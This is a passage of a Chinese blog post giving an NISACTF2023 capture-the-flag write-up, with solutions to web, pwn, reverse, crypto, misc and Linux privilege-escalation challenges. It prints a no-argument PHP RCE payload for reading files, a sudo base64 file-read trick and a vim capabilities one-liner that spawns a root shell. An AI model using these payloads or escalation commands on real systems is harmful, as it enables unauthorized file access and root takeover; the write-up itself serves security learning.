+<p>然后回到最开始的页面进行尝试</p>
+<p>经过测试发现这题过滤了包括<code>$</code>和<code>_</code>在内的大多数字符和所有数字</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416213904342.png" alt="image-20230416213904342"></p>
+<p>于是猜测是<a href="https://c1oudfl0w0.github.io/blog/2023/03/15/RCE%E6%80%BB%E7%BB%93/#%E6%97%A0%E5%8F%82rce">无参RCE</a></p>
+<p>直接上payload获取flag</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416214119104.png" alt="image-20230416214119104"></p>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="baigei"><a href="#baigei" class="headerlink" title="baigei"></a>baigei</h2><p>下载题目附件拖入ida并f5进行反编译</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416214443074.png" alt="image-20230416214443074"></p>
+<p>查看<code>login()</code>函数</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416214542336.png" alt="image-20230416214542336"></p>
+<p>得知<code>username</code>为admin，<code>password</code>为114514，由此可获取shell</p>
+<p>于是nc连接靶机</p>
+<p>题目提示flag在环境变量里，set获取环境变量得到flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416224046344.png" alt="image-20230416224046344"></p>
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="eazy-reverse"><a href="#eazy-reverse" class="headerlink" title="eazy reverse"></a>eazy reverse</h2><p>下载题目附件拖入ida64并f5进行反编译，直接发现flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416215028343.png" alt="image-20230416215028343"></p>
+<h2 id="bassssse-64"><a href="#bassssse-64" class="headerlink" title="bassssse 64"></a>bassssse 64</h2><p>下载题目附件拖入ida64并f5进行反编译</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416215127620.png" alt="image-20230416215127620"></p>
+<p>发现一串base64，在cyberchef解密得到flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416215239017.png" alt="image-20230416215239017"></p>
+<h2 id="random-world"><a href="#random-world" class="headerlink" title="random world"></a>random world</h2><p>下载题目附件得到pyhton源码</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
+flag <span class="token operator">=</span> <span class="token string">'***********************************'</span>
+random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+<span class="token comment"># result = [225, 55, 244, 96, 172, 137, 164, 162, 15, 134, 182, 80, 251, 91, 218, 48, 15, 209, 124, 214, 234, 4, 100, 193, 3, 49, 39, 44, 120, 90, 90, 59, 120, 231, 165]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>发现是固定种子的随机数生成与异或</p>
+<p>生成方式不变，直接逆向编写python脚本得到flag</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
+result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">244</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">218</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">209</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">214</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">193</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">]</span>
+random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+flag<span class="token operator">=</span> <span class="token string">''</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>l<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">5</span><span class="token operator">+</span>n<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416215527459.png" alt="image-20230416215527459"></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyCrypto"><a href="#babyCrypto" class="headerlink" title="babyCrypto"></a>babyCrypto</h2><p>下载题目附件获取密文与key</p>
+<p>询问AI得知国密中可替换DES&#x2F;AES的加密算法为<code>SM4</code></p>
+<p>直接在cyberchef内解密得到flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416215806299.png" alt="image-20230416215806299"></p>
+<h2 id="简单的莫斯电码"><a href="#简单的莫斯电码" class="headerlink" title="简单的莫斯电码"></a>简单的莫斯电码</h2><p>密文一眼莫斯</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220027914.png" alt="image-20230416220027914"></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="开门题"><a href="#开门题" class="headerlink" title="开门题"></a>开门题</h2><p>下载题目txt附件丢到010中发现存在大量零宽字符</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220236721.png" alt="image-20230416220236721"></p>
+<p>将整段txt内容使用<a target="_blank" rel="noopener" href="https://offdev.net/demos/zwsp-steg-js">网站</a>在线解密得到逆序flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220420024.png" alt="image-20230416220420024"></p>
+<p>编写脚本使其正序</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"&#125;ysae_os_si_yhpargonagets_ecaps_htdiw_orez&#123;galf"</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220534613.png" alt="image-20230416220534613"></p>
+<h2 id="osint1"><a href="#osint1" class="headerlink" title="osint1"></a>osint1</h2><p>手动爆破出斯洛伐克（</p>
+<h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="suuuuudo"><a href="#suuuuudo" class="headerlink" title="suuuuudo"></a>suuuuudo</h2><p>ssh连上靶机(用户名ctf，密码ctf)</p>
+<p>ls查看目录发现flag，但是权限不足不能直接cat读取</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220743498.png" alt="image-20230416220743498"></p>
+<p>使用<code>sudo -l</code>查看授权的命令列表</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416220915711.png" alt="image-20230416220915711"></p>
+<p>发现只有<code>base64</code>命令可以使用</p>
+<p>在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">网站</a>上查询对应的exp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> base64 <span class="token string">"<span class="token variable">$LFILE</span>"</span> <span class="token operator">|</span> base64 <span class="token parameter variable">--decode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>由此可以读取flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416221132266.png" alt="image-20230416221132266"></p>
+<h2 id="capabilities"><a href="#capabilities" class="headerlink" title="capabilities"></a>capabilities</h2><p>ssh连上靶机(用户名密码同上)（这里用虚拟机连接，因为windterm因为不明原因跑exp会卡住）</p>
+<p>ls查看目录发现vim和flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416221406126.png" alt="image-20230416221406126"></p>
+<p>根据题目名得知和capabilities有关</p>
+<p>查询得到相关exp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416221800333.png" alt="image-20230416221800333"></p>
+<p>vim在cap里面，于是尝试提权</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./vim <span class="token parameter variable">-c</span> <span class="token string">':py3 import os;os.setuid(0);os.execl("/bin/sh","sh","-c","reset; exec sh")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>提权成功直接执行命令获取flag</p>
+<p><img src="/blog/2023/04/16/NISACTF2023-WriteUp/image-20230416221948540.png" alt="image-20230416221948540"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
